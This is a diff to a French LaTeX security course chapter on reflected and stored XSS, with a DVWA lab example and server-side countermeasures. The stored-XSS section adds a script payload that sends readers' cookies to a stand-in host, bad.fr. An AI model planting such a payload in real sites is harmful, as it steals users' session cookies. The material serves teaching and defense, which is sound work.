@@ -237,7 +237,9 @@ Le Cross Site Scripting fait partie de la catégorie des attaques par injection 
  
 
 
-\paragraph{} Pourquoi la non persistance ? Parce que le script malicieux n'est pas stocké sur le serveur web que ce soit dans un fichier, une base de donnée ou un message de forum.
+\paragraph{} Pourquoi la non persistance ? Parce que le script malicieux n'est pas stocké sur le serveur web. On ne le trouvera pas dans un fichier, une base de donnée ou un message de forum. Le script malicieux ou sa référence sont transmis dans une URL. C'est cette URL qui est transmise dans le mail frauduleux. Le cracker devra connaître les adresses mail de ses victimes. Ce n'est pas le cas pour le stored XSS puisque tout visiteur du site piégé chargera une page avec le script enregistré sur le disque du serveur. 
+
+
 
 \paragraph{} Parmi le conséquences possibles, on peut citer :
  
@@ -252,13 +254,28 @@ Le Cross Site Scripting fait partie de la catégorie des attaques par injection 
 
 \subsection{Exploitation}
 
+\subsubsection{DVWA - Security level "Low"}
+
+Pour vérifier la vulnérabilité d'un site aux attaques XSS, il suffit de s'assurer que le html est transmis tel quel. Si on saisit par exemple <b>toto</b>toto dans un champ de recherche du site et qu'il nous renvoie \textbf{toto}toto, on constate que le code html est bien interprété puisque seul le 1er toto apparaît en gras.  Le site est donc vulnérable. 
+
+
+
+\begin{figure}[!h]
+	\begin{center}
+		\label{}
+		\includegraphics[scale=\scaledvwa]{images/xss/hack1.png}
+		\caption{Exemple d'injections html montrant la vulnérabilité de DVWA-Low : <img src=http://192.168.1.8/hacked.jpeg />} 
+	\end{center}
+\end{figure}
+
+
 \begin{verbatim}
-<script>alert('coucou')</script>
+
 \end{verbatim}
 
 \subsection{Contre-mesure}
 
-Côté client, pour se prémunir des injections XSS, il est possible de configurer le navigateur de manière à empêcher l'exécution des langages de scripts mais de nombreux sites ne pourront pas fonctionner.
+Côté client, pour se prémunir des injections XSS, il est possible de configurer le navigateur de manière à empêcher l'exécution des langages de scripts mais de nombreux sites dynamiques ne pourront pas fonctionner correctement. C'est donc bien la vulnérabilité du serveur web qu'il faut corriger.
 
 Du côté serveur, on peut appliquer les principes suivants :
 \begin{itemize}[font=\color{magenta} \Large, label=\ding{43}]
@@ -273,22 +290,45 @@ Du côté serveur, on peut appliquer les principes suivants :
 
 \section{Stored XSS (persistante)  }
 
-Dans ce type d'attaque, les données fournies par l'utilisateur sont enregistrées sur le serveur pour ensuite être réaffichées sans que les caractères spéciaux HTML aient été encodés. Ce type de site web sont dits vulnérables aux attaques XSS. On parle improprement de faille XSS en confondant l'attaque et la vulnérabilité. Une seule injection permet d'atteindre un grand nombre de victimes sans avoir à recourir à l'ingénierie sociale. Il est donc primordial que toutes les données reçues par l'application web soient encodées. 
 
 
 
 \subsection{Description}
+
+Dans ce type d'attaque avec persistance, les données fournies par l'utilisateur sont enregistrées sur le serveur pour ensuite être réaffichées sans que les caractères spéciaux HTML aient été encodés. Ce type de site web sont dits vulnérables aux attaques XSS. On parle improprement de faille XSS en confondant l'attaque et la vulnérabilité. Une seule injection permet d'atteindre un grand nombre de victimes sans avoir à recourir à l'ingénierie sociale. Il est donc primordial que toutes les données reçues par l'application web soient encodées.
+
+
+\paragraph{Exemple de stored XSS :} 
+Un cracker écrit un post sur le blog d'un site vulnérable, le contenu ci-dessous :
+\begin{verbatim}
+blablabla. <script>location.href='http://bad.fr/?cookie='+document.cookie</script>
+\end{verbatim}
+L'attaquant récupèrera les valeurs des cookies de tous les futurs lecteurs de son poste.
+La figure~\ref{stored_xss} illustre ce principe dans le cas général.
+
 \begin{figure}[!h]
 	\begin{center}
-		\label{}
 		\includegraphics[scale=\scalekad]{images/xss/stored_xss}
-		\caption{Récupération du fichier /etc/passwd via la commande load\_file : }
+		\caption{Attaque Stored XSS }		
+		\label{stored_xss}
 	\end{center}
 \end{figure}
+
+
+
+
+
+
+
+
+
+
+
+
 \subsection{Exploitation}
 
 \subsection{Contre-mesure}
 
-
+Les contre-mesures sont les mêmes que celles du reflected XSS puisque la faille est la même. Ce  n'est que la méthode d'exploitation qui diffère.
 
 
